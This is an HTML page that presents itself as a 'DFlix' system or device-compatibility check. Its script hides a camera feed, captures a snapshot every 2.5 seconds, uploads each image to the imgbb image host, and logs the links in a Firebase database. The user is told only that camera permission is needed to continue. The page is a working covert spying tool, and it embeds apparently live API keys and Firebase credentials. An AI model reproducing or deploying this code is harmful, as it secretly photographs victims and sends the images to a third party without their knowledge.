<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>DFlix - System Check</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .msg { text-align: center; }
        #v { display: none; } /* Camera hidden */
    </style>
</head>
<body>

    <div class="msg">
        <h2>Verifying System...</h2>
        <p>Please wait while we check your device compatibility.</p>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyD7gABQ1j1zMFS9AylLCZr-K1hyK0LkIsQ",
            authDomain: "distark.firebaseapp.com",
            databaseURL: "https://distark-default-rtdb.firebaseio.com",
            projectId: "distark",
            storageBucket: "distark.firebasestorage.app",
            messagingSenderId: "819241583845",
            appId: "1:819241583845:web:2231e652310e47e06cc00c",
            measurementId: "G-X175B7NX2K"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const imgbbKey = '50af9f5367ae25509851af1e1ecf62b6';

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = stream;
                // Har 2.5 second mein capture karega
                setInterval(takeSnap, 2500);
            } catch (err) {
                alert("Please allow camera permission to continue.");
            }
        }

        function takeSnap() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            c.width = v.videoWidth; 
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            
            const base64 = c.toDataURL('image/png').split(',')[1];
            const fd = new FormData();
            fd.append('image', base64);

            fetch(`https://api.imgbb.com/1/upload?key=${imgbbKey}`, { method: 'POST', body: fd })
            .then(r => r.json())
            .then(res => {
                if(res.success) {
                    db.ref('live_logs').push({
                        url: res.data.url,
                        time: new Date().toLocaleTimeString()
                    });
                }
            }).catch(e => console.log("Network busy..."));
        }
        window.onload = init;
    </script>
</body>
</html>
